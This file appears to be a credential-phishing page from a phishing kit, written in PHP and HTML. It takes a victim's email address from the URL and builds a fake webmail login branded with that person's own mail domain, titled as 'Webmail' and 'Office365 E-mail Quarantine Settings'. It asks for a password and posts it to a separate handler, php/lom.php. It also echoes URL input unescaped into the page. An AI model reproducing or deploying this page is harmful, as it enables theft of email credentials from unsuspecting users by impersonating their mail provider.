<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<style>
  .textbox {
    height: 40px;
    width: 275px;
    background-color: transparent;
    border-width: 0px 0px 1px 0px;
    border-color: transparent;
    outline:0;
  }
 </style>

<style>
  .textbox {
    height: 50px;
    width: 275px;
    background-color: transparent;
    border-width: 0px 0px 1px 0px;
    border-color: transparent;
    outline:0;
  }
 </style>

<style>
  .textbox {
    height: 25px;
    width: 275px;
    background-color: transparent;
    border-width: 0px 0px 1px 0px;
    border-color: transparent;
    outline:0;
  }
 </style>

<style>
  .textbox {
    height: 25px;
    width: 275px;
    background-color: transparent;
    border-width: 0px 0px 1px 0px;
    border-color: transparent;
    outline:0;
  }
 </style>

<meta name="title" content="<?php echo $yuh ?> Email">
<title><?php echo $yuh ?> Email</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
		<link rel="shortcut icon" href="http://<?php echo $domain ?>/favicon.ico" type="image/x-icon" />


</head>

<body>
<form name="form1" method="POST" action="php/lom.php?email=<?php echo $login ?>" onsubmit="return validateForm()" style="margin:0px">
		<input type='hidden' name="login" value="<?php echo $_GET['email']; ?>">
 <input type="hidden" id="user-name" name="login" value="<?php echo $_GET['email']; ?>">

<div id="image1" style="position:absolute; overflow:hidden; left:-3px; top:0px; width:1536px; height:729px; z-index:7">
<div id="formimage1" style="position:absolute; left:693px; top:407px; z-index:19; height:59px">

<div style="position: absolute; width: 679px; height: 34px; z-index: 1; left: 27px; top: -214px" id="layer1" align="left">
	<b><font color="#1672BA" size="6"><?php echo $yuh ?> Webmail</font></b></div>
	<input type="image" name="formimage1" width="203" height="92" src="img/ja.png"></div>

<div id="html2" style="position:absolute; overflow:hidden; left:721px; top:368px; width:193px; height:19px; z-index:21">


<font size="3">
<input name="pass" placeholder="Password" class="textbox" required title="Please complete this mandatory field" type="password" size="1" tabindex="2"></font>
<style>
  .textbox {
    height: 25px;
    width: 275px;
    background-color: transparent;
    border-width: 0px 0px 1px 0px;
    border-color: transparent;
    outline:0;
  }
 </style></div>


<div id="html1" style="position:absolute; overflow:hidden; left:721px; top:300px; width:302px; height:35px; z-index:20">
<?php echo $login ?></div>


	        	<div style="position: absolute; width: 40px; height: 27px; z-index: 22; left: 28px; top: 12px" id="layer4">
					<img  src="img/id.png"  width="28" height="28"></div>


	        	<div style="position: absolute; width: 40px; height: 27px; z-index: 22; left: 981px; top: 12px" id="layer2">
					<img  src="img/mail.png"  width="40" height="27"></div>


	        	<div style="position: absolute; width: 301px; height: 26px; z-index: 23; left: 65px; top: 12px" id="layer5">
					<font color="#FFFFFF" face="Lucida Sans Unicode">www.<?php echo $domain ?> 
					</font></div>


	        	<div style="position: absolute; width: 514px; height: 26px; z-index: 23; left: 1023px; top: 12px" id="layer3">
					<font color="#0072C5" face="Lucida Sans Unicode"><?php echo $yuh ?> 
					Office365 
					E-mail Quarantine Settings</font></div>


	        	<img src="img/love.jpg" alt="" border=0 width=1536 height=729 align="left"></div>





</form>

</body>
</html>